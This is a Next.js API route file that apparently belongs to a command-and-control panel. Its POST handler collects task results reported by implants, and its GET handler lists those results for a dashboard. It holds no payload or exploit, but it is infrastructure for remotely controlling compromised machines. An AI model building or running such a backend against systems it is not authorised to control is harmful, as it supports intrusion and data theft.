import { NextResponse, type NextRequest } from "next/server"
import { z } from "zod"
import { getImplantByImplantId, listImplantTasks, updateImplantTask } from "@/lib/db/implants"
import logger from "@/lib/logger"

const log = logger.child({ module: "api/dpanel/implant/result" })

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

const TaskResultSchema = z.object({
  task_id: z.string(),
  implant_id: z.string(),
  status: z.string(),
  result: z.unknown().optional(),
  error: z.string().optional(),
  timestamp: z.number(),
  duration: z.number(),
})

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    const body = await req.json()
    const result = TaskResultSchema.parse(body)

    // Verify implant exists
    const implant = await getImplantByImplantId(result.implant_id)
    if (!implant) {
      console.log(`[-] Task result from unknown implant: ${result.implant_id}`)
      return NextResponse.json({ error: "Unknown implant" }, { status: 404 })
    }

    // Find the task by task_id
    const tasks = await listImplantTasks(result.implant_id)
    const task = tasks.find(t => t.taskId === result.task_id)
    
    if (!task) {
      console.log(`[-] Task not found: ${result.task_id}`)
      return NextResponse.json({ error: "Task not found" }, { status: 404 })
    }

    // Update task with result
    const taskStatus = result.status === "success" ? "completed" : "failed"
    await updateImplantTask(
      task.id, 
      taskStatus, 
      result.result as Record<string, unknown> | undefined, 
      result.error
    )

    console.log(`[+] Task result received from ${result.implant_id}: ${result.task_id} - ${result.status}`)
    
    return NextResponse.json({ 
      success: true,
      received: true
    })
  } catch (error) {
    log.error({ err: error }, 'Task result error')
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}

// GET endpoint to retrieve results for dashboard
export async function GET(req: NextRequest): Promise<NextResponse> {
  try {
    const { searchParams } = new URL(req.url)
    const implantId = searchParams.get('implant_id')
    const status = searchParams.get('status')

    if (!implantId) {
      return NextResponse.json({ error: "implant_id required" }, { status: 400 })
    }

    const tasks = await listImplantTasks(implantId, status as any)
    
    // Convert to the format expected by the frontend
    const results = tasks.map(task => ({
      task_id: task.taskId,
      implant_id: task.implantId,
      status: task.status,
      result: task.result,
      error: task.error,
      timestamp: task.createdAt,
      duration: task.completedAt ? task.completedAt - task.createdAt : 0,
    }))
    
    return NextResponse.json({ 
      results: results,
      total: results.length
    })
  } catch (error) {
    log.error({ err: error }, 'Get results error')
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}